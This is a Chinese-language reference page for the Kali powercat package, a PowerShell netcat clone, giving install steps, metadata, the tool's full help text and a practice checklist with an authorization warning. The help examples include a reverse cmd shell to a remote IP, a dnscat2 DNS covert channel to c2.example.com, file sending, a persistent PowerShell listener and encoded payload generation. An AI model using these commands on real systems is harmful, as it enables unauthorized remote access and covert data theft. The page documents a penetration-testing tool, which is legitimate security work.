# powercat

> Netcat features all in powershell v2 This package contains a netcat powershell version. It’s a simple utility which reads and writes data across network connections using DNS or UDP protocol.

> **功能分类**：Windows 资源 ｜ **Kali 包**：`powercat` ｜ **官方文档**：<https://www.kali.org/tools/powercat/>

## 1. 安装

```bash
sudo apt update
sudo apt install powercat
```

| 项目 | 内容 |
|------|------|
| 版本 | 0.0~git20240305.4e33fdf |
| 架构 | all |
| 可执行命令 | `powercat` |
| 依赖 | `kali-defaults` |
| 安装体积 | 55 KB |
| 官网 | <https://github.com/besimorhino/powercat> |
| 源码仓库 | <https://gitlab.com/kalilinux/packages/powercat> |
| 包追踪 | <https://pkg.kali.org/pkg/powercat> |

## 2. 官方用法示例

> 官方工具页未附示例，可直接看下一节的 `-h` / man 原文自取。

```bash
powercat -h          # 查看用法
man powercat         # 查看手册
```

## 3. 命令与参数（官方 help / man 原文）

本包提供 1 个可执行命令，下面是官方页面内嵌的帮助原文。

### `powercat`

官方给出的调用示例：`powercat -h`

```text
root@kali:~# powercat -h
powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat
This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.
Usage: powercat [-c or -l] [-p port] [options]
  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.
  -l              Listen Mode. Start a listener on the port specified by -p.
  -p  <port>      Port. The port to connect to, or the port to listen on.
  -e  <proc>      Execute. Specify the name of the process to start.
  -ep             Execute Powershell. Start a pseudo powershell session. You can
                  declare variables and execute commands, but if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.
  -r  <str>       Relay. Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
                  Listener Relay Format: -r <protocol>:<port>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                  must send data before the server can respond.
  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                  Specify the dns server to -c, the dns port to -p, and specify the
                  domain to this option, -dns. This is only a client.
                  Get the server here: https://github.com/iagox86/dnscat2
  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                  recieve before exiting. Set to zero when receiving files, and set high
                  for more stability over the internet.
  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                  connecting. Default: 60
  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  established. Used for moving files. You can provide the path to a file,
                  a byte array object, or a string. You can also pipe any of those into
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
  -o  <type>      Output. Specify how powercat should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
  -of <path>      Output File.  Specify the path to a file to write output to.
  -d              Disconnect. powercat will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.
  -rep            Repeater. powercat will continually restart after it is disconnected.
                  Used for setting up a persistent server.
  -g              Generate Payload.  Returns a script as a string which will execute the
                  powercat with the options you have specified. -i, -d, and -rep will not
                  be incorporated.
  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>
  -h              Print this help message.
Examples:
  Listen on port 8000 and print the output to the console.
      powercat -l -p 8000
  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
      powercat -c 10.1.1.1 -p 443 -e cmd -v
  Connect to the dnscat2 server on c2.example.com, and send dns queries
  to the dns server on 10.1.1.1 port 53.
      powercat -c 10.1.1.1 -p 53 -dns c2.example.com
  Send a file to 10.1.1.15 port 8000.
      powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
  Write the data sent to the local listener on port 4444 to C:\outfile
      powercat -l -p 4444 -of C:\outfile
  Listen on port 8000 and repeatedly server a powershell shell.
      powercat -l -p 8000 -ep -rep
  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
      powercat -l -p 8000 -r tcp:10.1.1.1:9000
  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
  sending queries to 10.1.1.1 port 53.
      powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
Learn more with
OffSec
Want to learn more about powercat? get access to in-depth training and hands-on labs:
PEN-200: 12. Client-side Attacks: 12.2.3. Leveraging Microsoft Word Macros
PEN-200: 12.3.1. Client-side Attacks: Obtaining Code Execution via Windows Library Files
PEN-200 course
Updated on: 2025-Dec-09
 Edit this page
poshc2
powersploit
LIGHT
DARK
Links
Home
Download / Get Kali
Blog
OS Documentation
Tool Documentation
System Status
Archived Releases
Partnerships
Platforms
ARM (SBC)
NetHunter (Mobile)
Amazon AWS
Docker
Linode
Microsoft Azure
Microsoft Store (WSL)
Vagrant
Development
Bug Tracker
Continuous Integration
Network Mirror
Package Tracker
GitLab
Community
Discord
Support Forum
PeerTube
Follow Us
Bluesky
Facebook
Instagram
Mastodon
Substack
X
Newsletter
RSS
Policies
Cookie Policy
Privacy Policy
Trademark Policy
© OffSec Services Limited 2026. All rights reserved.
Kali Linux is part of OffSec's Community Projects
Learn more about OffSec's free, open-source penetration testing tools for cybersecurity professionals
```

## 4. 实践清单

按顺序做完这五步，就能把工具从「装上」推进到「会用」：

- [ ] **1.** **装好并确认版本** —— `sudo apt install powercat`，再执行 `powercat --version` 2>/dev/null || `powercat -V`
- [ ] **2.** **读官方帮助** —— `powercat -h`，需要细节时 `man powercat`
- [ ] **3.** **在自有靶场跑最小用例** —— 官方给出的调用形式是：`Usage: powercat [-c or -l] [-p port] [options]`
- [ ] **4.** **对照官方文档确认参数语义** —— <https://www.kali.org/tools/powercat/>，重点核对上一步用到的每个参数
- [ ] **5.** **记录输出并解读** —— 把关键字段抄进笔记，写清「它说明什么」「下一步该做什么」

> ⚠️ 只在**自己的设备**或**获得书面授权**的目标上使用。未授权扫描/入侵在多数司法辖区构成违法。
> 靶场搭建见 [`../../labs/README.md`](../../labs/README.md)。

## 5. 相关

- 精讲教程：本工具暂无专篇，可在 [`../../tools/tutorials/`](../../tools/tutorials/) 中按分类查阅同类工具
- 按攻击阶段浏览同类工具：[`../../tools/by-attack/command-and-control.md`](../../tools/by-attack/command-and-control.md)
- 按包速查：[`../catalog/`](../catalog/) ｜ 全量清单：[`../catalog/all-tools.md`](../catalog/all-tools.md)
- Kali 官方工具页：<https://www.kali.org/tools/powercat/>

---

## 来源

- 工具元数据与用法示例、help 原文均抓取自 <https://www.kali.org/tools/powercat/>（同步日期：2026-09-15）
- 抓取与生成脚本：`scripts/fetch_kali_tools.py` · `scripts/fetch_kali_usage.py` · `scripts/gen_kali_reference.py`
